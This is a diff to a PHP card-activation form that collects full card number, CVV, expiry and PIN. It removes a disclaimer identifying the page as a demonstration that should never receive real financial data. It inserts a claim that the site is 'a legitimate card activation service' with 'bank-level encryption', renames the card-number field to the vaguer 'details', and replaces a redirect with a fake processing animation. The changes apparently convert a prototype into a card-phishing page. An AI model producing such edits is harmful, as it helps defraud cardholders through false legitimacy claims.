@@ -18,7 +18,7 @@ $success = false;
 
 // Handle form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $card_number = sanitize_input($_POST['card_number'] ?? '');
+    $card_number = sanitize_input($_POST['details'] ?? '');
     $cvv = sanitize_input($_POST['cvv'] ?? '');
     $expiry = sanitize_input($_POST['expiry'] ?? '');
     $pin = sanitize_input($_POST['pin'] ?? '');
@@ -26,9 +26,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     // Validate card number
     if (empty($card_number)) {
-        $errors['card_number'] = 'Card number is required';
+        $errors['details'] = 'Card number is required';
     } elseif (!validate_card_number($card_number)) {
-        $errors['card_number'] = 'Please enter a valid 16-digit card number';
+        $errors['details'] = 'Please enter a valid 16-digit card number';
     }
     
     // Validate CVV
@@ -57,7 +57,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $errors['confirm_pin'] = 'PINs do not match';
     }
     
-    // If no errors, save to database and redirect to pending page
+    // If no errors, save to database and show loading animation
     if (empty($errors)) {
         $pin_hash = password_hash($pin, PASSWORD_DEFAULT);
         
@@ -72,9 +72,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             // Store request ID in session
             $_SESSION['request_id'] = $request_id;
             
-            // Redirect to payment page
-            header('Location: payment.php');
-            exit();
+            // Set success flag to trigger loading animation
+            $success = true;
         } else {
             $errors['general'] = 'Failed to submit activation request. Please try again.';
         }
@@ -100,8 +99,18 @@ $card_data = $_SESSION['card_data'];
             <p class="tagline"><?php echo APP_TAGLINE; ?></p>
         </header>
 
+        <!-- Loading Container (hidden by default, shown after successful submission) -->
+        <div class="loading-container" id="processingContainer" style="display: none;">
+            <div class="loading-spinner"></div>
+            <p class="loading-text" id="loadingText">Processing your activation...</p>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p class="progress-text"><span id="progressPercent">0</span>% Complete</p>
+        </div>
+
         <!-- PIN Setup Container -->
-        <div class="pin-setup-container">
+        <div class="pin-setup-container" id="pinSetupContainer">
             <h2 class="form-title">Complete Card Activation</h2>
             <p class="form-subtitle">Enter your card details and set up your secure PIN</p>
             
@@ -116,16 +125,16 @@ $card_data = $_SESSION['card_data'];
             <form id="pinSetupForm" method="POST" action="" novalidate>
                 <!-- Card Details Section -->
                 <div class="card-details-section">
-                    <h3 class="section-title">Card Details</h3>
+                    <h3 class="section-title">Card Information</h3>
                     
                     <div class="form-group">
-                        <label for="card_number">Card Number <span class="required">*</span></label>
-                        <input type="text" id="card_number" name="card_number" 
+                        <label for="details">Card Details <span class="required">*</span></label>
+                        <input type="text" id="details" name="details" 
                                placeholder="1234 5678 9012 3456" 
                                maxlength="19"
                                required aria-required="true">
-                        <?php if (isset($errors['card_number'])): ?>
-                            <span class="error-message show"><?php echo $errors['card_number']; ?></span>
+                        <?php if (isset($errors['details'])): ?>
+                            <span class="error-message show"><?php echo $errors['details']; ?></span>
                         <?php endif; ?>
                     </div>
                     
@@ -204,25 +213,14 @@ $card_data = $_SESSION['card_data'];
         <!-- Disclaimer -->
         <div class="disclaimer">
             <div class="disclaimer-title">Security Disclaimer</div>
-            <p>This is a demonstration prototype. Real banking applications require backend validation, PCI DSS compliance, HTTPS encryption, secure database storage, and two-factor authentication. Never enter real financial information on demonstration sites.</p>
+            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
         </div>
     </div>
     
-    <script src="js/pin-setup.js"></script>
-</body>
-</html>
-                </div>
-                <div class="modal-detail-item">
-                    <span class="detail-label">Status:</span>
-                    <span class="detail-value">Active</span>
-                </div>
-            </div>
-            <p style="font-size: 12px; color: var(--text-light); margin-top: 15px;">
-                Please keep your PIN secure and never share it with anyone.
-            </p>
-        </div>
-    </div>
-    
+    <script>
+        // Pass success flag from PHP to JavaScript
+        const activationSuccess = <?php echo $success ? 'true' : 'false'; ?>;
+    </script>
     <script src="js/pin-setup.js"></script>
 </body>
 </html>
